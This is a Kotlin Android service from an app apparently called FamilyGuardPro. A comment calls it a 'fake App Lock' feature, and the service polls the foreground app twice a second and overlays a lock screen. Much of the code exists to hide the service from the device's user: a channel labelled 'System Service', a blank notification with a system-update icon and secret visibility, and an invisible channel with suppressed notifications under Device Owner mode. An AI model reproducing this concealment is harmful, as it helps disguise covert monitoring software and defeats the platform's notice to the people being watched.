package com.familyguardpro.applock

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import androidx.core.app.NotificationCompat
import com.familyguardpro.R
import android.app.usage.UsageStatsManager
import android.app.usage.UsageEvents
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.familyguardpro.utils.PreferenceManager

/**
 * AppLock Service - Monitors app launches and shows lock screen
 * This is part of the fake "App Lock" app functionality
 */
class AppLockService : Service() {
    
    companion object {
        private const val TAG = "AppLockService"
        private const val NOTIFICATION_ID = 2001
        private const val CHANNEL_ID = "applock_service"
        private const val CHECK_INTERVAL_MS = 500L
        
        // Re-lock options
        const val RELOCK_IMMEDIATELY = 0
        const val RELOCK_SCREEN_OFF = 1
        const val RELOCK_AFTER_1_MIN = 2
        const val RELOCK_AFTER_5_MIN = 3
        const val RELOCK_AFTER_30_MIN = 4
    }
    
    private lateinit var preferenceManager: PreferenceManager
    private val handler = Handler(Looper.getMainLooper())
    private var isRunning = false
    
    // Track unlocked apps and their unlock time
    private val unlockedApps = mutableMapOf<String, Long>()
    private var lastForegroundApp: String? = null
    
    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        createNotificationChannel()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START" -> startMonitoring()
            "STOP" -> stopMonitoring()
            "UNLOCK" -> {
                val packageName = intent.getStringExtra("package_name")
                packageName?.let { unlockApp(it) }
            }
        }
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background service"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }
    
    private fun startMonitoring() {
        if (isRunning) return
        isRunning = true
        
        // Check if Device Owner mode - use invisible channel
        val doManager = try {
            com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
        } catch (e: Exception) { null }
        
        val channelId = if (doManager?.isDeviceOwner() == true) {
            com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
            com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
        } else {
            CHANNEL_ID
        }
        
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
        
        startForeground(NOTIFICATION_ID, notification)
        
        // Suppress notification in Device Owner mode
        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
            this, NOTIFICATION_ID
        )
        
        startAppMonitor()
        Log.d(TAG, "App lock monitoring started")
    }
    
    private fun stopMonitoring() {
        isRunning = false
        handler.removeCallbacksAndMessages(null)
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }
    
    private fun startAppMonitor() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isRunning) return
                
                checkForegroundApp()
                handler.postDelayed(this, CHECK_INTERVAL_MS)
            }
        }
        handler.post(runnable)
    }
    
    private fun checkForegroundApp() {
        val foregroundApp = getForegroundApp()
        
        if (foregroundApp != null && foregroundApp != lastForegroundApp) {
            lastForegroundApp = foregroundApp
            
            // Check if this app is locked
            val lockedApps = preferenceManager.getLockedApps()
            if (lockedApps.contains(foregroundApp)) {
                // Check if it's been unlocked recently
                if (!isAppUnlocked(foregroundApp)) {
                    // Show lock screen
                    showLockScreen(foregroundApp)
                }
            }
        }
    }
    
    private fun getForegroundApp(): String? {
        val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
            ?: return null
        
        val endTime = System.currentTimeMillis()
        val startTime = endTime - 10000 // Last 10 seconds
        
        val usageEvents = usageStatsManager.queryEvents(startTime, endTime)
        var lastApp: String? = null
        
        while (usageEvents.hasNextEvent()) {
            val event = UsageEvents.Event()
            usageEvents.getNextEvent(event)
            
            if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                lastApp = event.packageName
            }
        }
        
        return lastApp
    }
    
    private fun isAppUnlocked(packageName: String): Boolean {
        val unlockTime = unlockedApps[packageName] ?: return false
        val currentTime = System.currentTimeMillis()
        
        val relockOption = preferenceManager.getRelockTime()
        val relockAfterMs = when (relockOption) {
            RELOCK_IMMEDIATELY -> 0L
            RELOCK_SCREEN_OFF -> Long.MAX_VALUE // Handled separately
            RELOCK_AFTER_1_MIN -> 60 * 1000L
            RELOCK_AFTER_5_MIN -> 5 * 60 * 1000L
            RELOCK_AFTER_30_MIN -> 30 * 60 * 1000L
            else -> 0L
        }
        
        return currentTime - unlockTime < relockAfterMs
    }
    
    fun unlockApp(packageName: String) {
        unlockedApps[packageName] = System.currentTimeMillis()
        Log.d(TAG, "App unlocked: $packageName")
    }
    
    private fun showLockScreen(packageName: String) {
        val intent = Intent(this, AppLockScreenActivity::class.java).apply {
            putExtra("package_name", packageName)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
        }
        startActivity(intent)
    }
    
    // Called when screen is turned off
    fun onScreenOff() {
        val relockOption = preferenceManager.getRelockTime()
        if (relockOption == RELOCK_SCREEN_OFF) {
            unlockedApps.clear()
            Log.d(TAG, "All apps re-locked due to screen off")
        }
    }
}
